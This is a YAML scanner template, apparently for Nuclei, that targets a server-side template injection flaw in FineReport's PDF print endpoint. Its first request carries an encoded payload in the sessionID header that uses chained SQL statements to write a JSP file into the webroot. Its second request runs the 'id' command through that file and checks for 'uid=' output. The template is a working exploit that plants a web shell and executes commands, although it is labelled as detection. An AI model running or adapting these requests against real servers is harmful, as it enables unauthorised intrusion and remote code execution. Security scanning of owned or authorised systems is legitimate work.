id: poc-yaml-finereport-pdf-template-injection
info:
  name: 帆软报表 pdf 模板注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: ssti
  description: |
    This template detects a Server-Side Template Injection (SSTI) vulnerability in FineReport's PDF template functionality.
http:
  - raw:
      - |
        GET /webroot/decision/nx/report/v9/print/ie/pdf HTTP/1.1
        Host: {{Hostname}}
        sessionID: [24][7B][5F][5F]fr[5F]locale[5F][5F][3D]sql[28][27]FRDemo[27][2C]DECODE[28][27][25]25EF[25]25BB[25]25BFATTACH[25]2520DATABASE[25]2520[25]2527[2E][2E][25]252Fwebapps[25]252Fwebroot[25]252Fxxxx[2E]jsp[25]2527[25]2520as[25]2520qwerty[25]253B[27][29][2C]1[2C]1[29][7D][24][7B][5F][5F]fr[5F]locale[5F][5F][3D]sql[28][27]FRDemo[27][2C]DECODE[28][27][25]25EF[25]25BB[25]25BFCREATE[25]2520TABLE[25]2520qwerty[2E]rce[25]2528data[25]2520text[25]2529[25]253B[27][29][2C]1[2C]1[29][7D][24][7B][5F][5F]fr[5F]locale[5F][5F][3D]sql[28][27]FRDemo[27][2C]DECODE[28][27][25]25EF[25]25BB[25]25BFINSERT[25]2520INTO[25]2520qwerty[2E]rce[25]2528data[25]2529[25]2520VALUES[25]2520[25]2528x[25][25]2527[25]2529[25]253B[27][29][2C]1[2C]1[29][7D]
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "PDFReader"
  - raw:
      - |
        GET /webroot/xxxx.jsp?cmd=id HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "uid="
          - "gid="
          - "CREATE TABLE"
          - "SQLite format"
      - type: word
        part: header
        words:
          - "/webroot"
